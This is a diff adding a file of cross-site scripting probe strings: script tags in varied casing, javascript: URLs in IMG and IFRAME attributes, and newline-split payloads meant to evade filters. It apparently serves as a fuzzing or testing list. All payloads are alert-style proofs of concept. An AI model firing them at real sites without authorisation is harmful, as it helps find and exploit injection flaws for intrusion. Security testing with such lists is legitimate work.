@@ -1,0 +1,24 @@
+<script>alert('XSS')</script>
+alert(document.domain);
+<script>alert("XSS")</script>
+<script>alert(`XSS`)</script>
+<strong>1'"()&%<acx><ScRiPt >vf8S(9896)</ScRiPt></strong></td>
+<ScRiPt>alert('XSS')</ScRiPt>
+1'"()&%<acx><ScRiPt >vf8S(9896)</ScRiPt>
+"prompt(1)
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<iframe src="javascript:alert('XSS')"></iframe>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<iframe src=JaVaScRiPt:alert('XSS')></iframe>
+<IFRAME SRC=`javascript:alert("RSnake says, 'XSS'")`></IFRAME>
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC="jav
+ascript:alert('XSS');">
+<IMG SRC="jav
+ascript:alert('XSS');">
